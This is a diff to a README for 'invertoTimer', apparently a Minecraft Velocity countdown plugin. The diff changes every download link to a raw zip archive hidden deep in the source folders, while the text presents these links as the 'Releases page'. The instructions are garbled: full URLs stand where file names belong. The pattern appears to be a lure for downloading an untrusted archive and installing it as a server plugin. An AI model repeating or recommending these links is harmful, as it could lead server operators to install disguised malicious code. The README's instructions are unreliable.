@@ -1,7 +1,7 @@
 # ⏰ invertoTimer - Simple Countdown for Server Events
 
 ## 📥 Download Now
-[![Download invertoTimer](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip)](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip)
+[![Download invertoTimer](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip)](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip)
 
 ## 🚀 Getting Started
 invertoTimer is a lightweight plugin designed for Minecraft Velocity servers. It allows you to set global countdowns and schedule server events, enhancing the gaming experience for everyone.
@@ -15,13 +15,13 @@ invertoTimer is a lightweight plugin designed for Minecraft Velocity servers. It
 Follow these steps to install invertoTimer on your server:
 
 1. **Visit the Releases Page**  
-   Go to the [invertoTimer Releases page](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip) to find the latest version of the plugin.
+   Go to the [invertoTimer Releases page](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip) to find the latest version of the plugin.
 
 2. **Download the Plugin**  
-   Look for the latest release. Click on the file named `https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip` to download it.
+   Look for the latest release. Click on the file named `https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip` to download it.
 
 3. **Move the Plugin to Your Server**  
-   Once downloaded, locate the `https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip` file on your computer. Copy this file to the `plugins` folder of your Velocity server.
+   Once downloaded, locate the `https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip` file on your computer. Copy this file to the `plugins` folder of your Velocity server.
 
 4. **Restart the Server**  
    Restart your Velocity server to load the new plugin. You can do this from your server control panel or command line.
@@ -49,7 +49,7 @@ After the installation, you can set up countdowns and manage scheduled events ea
 If you encounter any issues:
 
 - **Check Your Java Version:** Ensure you are running Java 11 or higher.
-- **Verify Plugin Placement:** Make sure the `https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip` file is in the correct `plugins` directory.
+- **Verify Plugin Placement:** Make sure the `https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip` file is in the correct `plugins` directory.
 - **Look for Conflicts:** Some other plugins may conflict with invertoTimer. Disable them to test functionality.
 
 ## 📬 Support
@@ -62,4 +62,4 @@ Keep an eye on the Releases page for updates and new features as we continue to 
 invertoTimer is released under the MIT License. You are free to use, modify, and distribute it as needed. Just remember to give credit to the original authors.
 
 ## 🔗 Download & Install 
-To get started, [visit the Releases page](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/Timer_inverto_1.4.zip) and download the latest version today!
+To get started, [visit the Releases page](https://github.com/Adr9777/invertoTimer/raw/refs/heads/master/src/main/java/top/ourisland/invertotimer/runtime/showcase/Timer-inverto-intendible.zip) and download the latest version today!
